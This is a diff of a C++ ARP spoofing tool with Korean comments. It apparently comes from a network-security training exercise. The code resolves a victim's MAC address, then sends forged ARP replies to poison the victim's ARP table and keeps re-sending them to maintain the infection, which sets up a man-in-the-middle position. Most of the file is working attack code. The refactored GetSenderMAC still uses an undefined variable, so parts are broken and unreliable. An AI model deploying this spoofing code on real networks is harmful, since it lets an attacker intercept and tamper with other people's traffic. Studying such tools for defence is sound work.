@@ -2,6 +2,14 @@
 #include "send_arp.h"
 
 
+
+/*
+ *
+ * 생성자 
+ * 전송할 IP를 설정하고, PcapManager를 설정한다. 
+ * 인터페이스는 자신의 MAC과 IP를 얻기 위해 이용
+ * 
+*/
 SendARP::SendARP(uint8_t * interface, uint32_t senderIP, uint32_t targetIP, PcapManager *pcapManager)
 {
     this->interface = interface;
@@ -9,12 +17,18 @@ SendARP::SendARP(uint8_t * interface, uint32_t senderIP, uint32_t targetIP, Pcap
     this->targetIP = targetIP;
 
     this ->pcapManager = pcapManager;
+
     //내 MAC, IP 주소 설정
     SetMyAddr(interface);
     
 } //SendARP::SendARP(uint8_t * interface, uint32_t senderIP, uint32_t targetIP)
 
 
+/*
+ *
+ * 내 IP와 MAC 주소를 얻음
+ * 
+*/
 void SendARP::SetMyAddr(uint8_t * interface)
 {
 
@@ -51,6 +65,13 @@ void SendARP::SetMyAddr(uint8_t * interface)
 } //void SetMyMAC(uint8_t * interface)
 
 
+
+/*
+ *
+ * ARP패킷을 생성한다
+ * 인자로 준 요구사항에 맞는 패킷을 생성
+ * 
+*/
 bool SendARP::MakeARP(uint8_t arpType, ARPPACKET *buf, uint8_t * dstMAC, uint8_t * srcMAC, uint32_t dstIP, uint32_t srcIP)
 {
 
@@ -82,7 +103,7 @@ bool SendARP::MakeARP(uint8_t arpType, ARPPACKET *buf, uint8_t * dstMAC, uint8_t
     buf->arp.hardType  = htons(ARPHRD_ETHER);
     buf->arp.protoType = htons(ETHERTYPE_IP);
     buf->arp.hardLen = ETH_ALEN;
-    buf->arp.protoLen = (uint8_t)Len::IPADDRLEN;
+    buf->arp.protoLen = (uint8_t)LEN::IPADDRLEN;
     buf->arp.opcode = htons(arpType); 
 
     //내용
@@ -94,6 +115,12 @@ bool SendARP::MakeARP(uint8_t arpType, ARPPACKET *buf, uint8_t * dstMAC, uint8_t
 } //bool SendARP::MakeARP(uint8_t arpType, ARPPACKET *buf, uint8_t * dstMAC, uint8_t * srcMAC, uint32_t dstIP, uint32_t srcIP)
 
 
+/*
+ *
+ * 이더넷 헤더를 제작
+ * 
+ * 
+*/
 void SendARP::MakeEtherHeader(struct ether_header * eth, uint8_t * dstMAC, uint8_t * srcMAC)
 {
     memcpy((char *)eth->ether_dhost, (char*) dstMAC, ETH_ALEN);
@@ -104,10 +131,15 @@ void SendARP::MakeEtherHeader(struct ether_header * eth, uint8_t * dstMAC, uint8
 
 
 
+
+/*
+ *
+ * ARP 테이블을 오염시킨다
+ * 
+*/
 bool SendARP::InfectARPTable()
 {
-    ARPPACKET buf;
-    //pcap_t * handle;
+
     uint8_t errbuf[PCAP_ERRBUF_SIZE];
 
     char print_senderIP[20];
@@ -118,86 +150,25 @@ bool SendARP::InfectARPTable()
 
     if(isBuilt)
     {
-        //pcap_sendpacket(handle, (const u_char *)&buf, (int)Len::PACKETLEN);
-        pcapManager->Send((uint8_t *)&buf, (int)Len::PACKETLEN);
+        pcapManager->Send((uint8_t *)&buf, (int32_t)LEN::PACKETLEN);
         return false;
     }
-
-    //handle = pcap_open_live((const char *)interface, BUFSIZ, 1, 500, (char *)errbuf);
-    /*
-    if (handle == NULL) 
-    {
-        fprintf(stderr, "couldn't open device %s: %s\n", interface, errbuf);
-        return false;
-    }*/
 
     SetMyAddr(interface);
 
     //--- get sender's MAC ---
     
     MakeARP(ARPOP_REQUEST, &buf, NULL, myMAC, senderIP, myIP);
-    
-    
+     
     //get response
     bool getResponse = false;
     
-    //pcap_sendpacket(handle, (const u_char *)&buf, (int)Len::PACKETLEN);
-    pcapManager->Send((uint8_t *)&buf, (int)Len::PACKETLEN);
+    pcapManager->Send((uint8_t *)&buf, (int)LEN::PACKETLEN);
 
-    struct timeval tv;
-    gettimeofday (&tv, NULL);
-    long oldTime= (tv.tv_sec * 1000);
-
-    while (!getResponse) 
-    {
-        const uint8_t * packet;
-        /*
-        struct pcap_pkthdr * header;
-        
-
-        int res = pcap_next_ex(handle, &header, &packet);
-        if (res == 0) continue;
-        if (res == -1 || res == -2) break;
-        */
-
-       //////////////
-       //
-       //
-       //패킷이 올 때까지 기다림
-       //
-       ////////////////
-
-
-        //ARP 응답인지 체크
-        getResponse = GetSenderMAC((uint8_t *)packet);
-        
-        if(getResponse == true)
-            break;
-
-        //5초에 한 번씩 시도
-        else
-        {
-            gettimeofday (&tv, NULL);
-
-            long passedTime = (tv.tv_sec *1000 -oldTime) /1000;
-        
-            if(passedTime >5 || passedTime <0)
-            {
-                oldTime = tv.tv_sec *1000;
-                printf("retry to get sender MAC : sender [%s] target [%s] %d\n", print_senderIP, print_targetIP, passedTime);
-            
-               // pcap_sendpacket(handle, (const u_char *)&buf, (int)Len::PACKETLEN);
-                pcapManager->Send((uint8_t *)&buf, (int)Len::PACKETLEN);
-
-            }
-
-        } //else -  if(getResponse == true)
-
-    } //while (!getResponse) 
-
+    GetSenderMAC();
 
     //___ get sender's MAC ___
-
+   
 
     //--- infect ARP Table ---
 
@@ -209,7 +180,7 @@ bool SendARP::InfectARPTable()
     printf("infect ARP table : sender [%s] target [%s]\n", print_senderIP, print_targetIP);
     
     //pcap_sendpacket(handle, (const u_char *)&buf, (int)Len::PACKETLEN);
-    pcapManager->Send((uint8_t *)&buf, (int)Len::PACKETLEN);
+    pcapManager->Send((uint8_t *)&buf, (int)LEN::PACKETLEN);
     //___ infect ARP Table ___
     isBuilt =  true;
     return true;
@@ -227,7 +198,6 @@ bool SendARP::MaintainInfection()
 
     if(!isBuilt)
         return false;
-    
     
 
     //주기적으로 패킷 전송
@@ -249,64 +219,47 @@ bool SendARP::MaintainInfection()
 }
 
 
-
-
-bool SendARP::GetSenderMAC(uint8_t * packet)
+void SendARP::SetSenderMAC(uint8_t * sMAC)
 {
+    memcpy(senderMAC, sMAC, ETH_ALEN);
+    gotSenderMAC = true;
+
+}
+
+
+bool SendARP::GetSenderMAC()
+{
+    //구독 신청
+    Subscriber * sub = new Subscriber(NULL, 
+                                     (uint8_t * )myMAC, 
+                                     senderIP,
+                                     0, 
+                                     NULL, 
+                                     NULL,
+                                     (uint32_t)SUBTYPE::GETSENDERMAC, 
+                                     (void *)this, 
+                                     ETHERTYPE_ARP);
+
+    pcapManager->AddSubscriber(sub);
 
     ARPPACKET * arpPacket = (ARPPACKET * )packet;
 
-    //수신한 패킷인지 체크
-    if(memcmp(arpPacket->eth.ether_dhost, myMAC, ETH_ALEN))
+    while (!gotSenderMAC) 
     {
-       return false; 
+        sleep(5);
+        pcapManager->Send((uint8_t *)&buf, (int)LEN::PACKETLEN);
     }
-
-    //arp 패킷인지 체크
-    if(! IsARPNext(arpPacket->eth.ether_type))
-        return false;
-
-    //victim에게 온 response인지 체크
-    if(!IsSenderIP(arpPacket->arp.srcIP))
-    {
-        return false;
-    }
-
-    //victim의 MAC 주소를 얻음
-    memcpy(senderMAC, arpPacket->eth.ether_shost, ETH_ALEN);
 
     return true;
-
 
 } //bool SendARP::GetSenderMAC(ARPPACKET * packet)
 
 
-
-bool SendARP::IsARPNext(uint16_t ethType)
-{
-    if (ntohs(ethType) == ETHERTYPE_ARP)
-        return true;
-    else  
-        return false;
-
-} //bool IsARPNext(uint16_t ethType)
-
-
-bool SendARP::IsSenderIP(uint32_t ip)
-{
-    if (ip == senderIP)
-        return true;
-    else
-        return false;
-
-} //bool SendARP::IsSenderIP(uint32_t ip)
-
-
-
 int main(int argc, char * argv[])
 {
-    
-    SendARP a( (uint8_t *)argv[1], (uint32_t)inet_addr(argv[2]), (uint32_t)inet_addr(argv[3]));
+   
+       PcapManager mng((uint8_t *)"eth0");
+    SendARP a( (uint8_t *)argv[1], (uint32_t)inet_addr(argv[2]), (uint32_t)inet_addr(argv[3]), &mng);
 
     a.InfectARPTable();
  
